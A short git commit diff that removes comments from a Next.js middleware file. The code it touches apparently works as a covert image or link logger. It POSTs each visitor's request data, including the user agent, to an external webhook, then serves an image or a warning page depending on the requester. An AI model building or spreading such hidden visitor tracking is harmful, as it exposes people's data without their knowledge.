987f39eb6ddc71148ab36630063ef23169612db9
uschatsiteme <140946250+uschatsiteme@users.noreply.github.com>
2025-03-10 13:34:59 -0700

    Update middleware.js

--- middleware.js
+++ middleware.js
@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in your project's environment variables.
+const webhook = process.env.WEBHOOK_URL
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
@@ -20,9 +20,9 @@ export async function middleware(req){
     }],
   }),headers:{"content-type":"application/json"},method:"POST"})
   if(source){
-    // Return the image.
+  
     return NextResponse.rewrite(new URL("/mini.png",req.url))
   }else{
-    // Make a message for whoever takes the risk to directly click.
+    
     return NextResponse.rewrite(new URL("/page.html",req.url));
   }
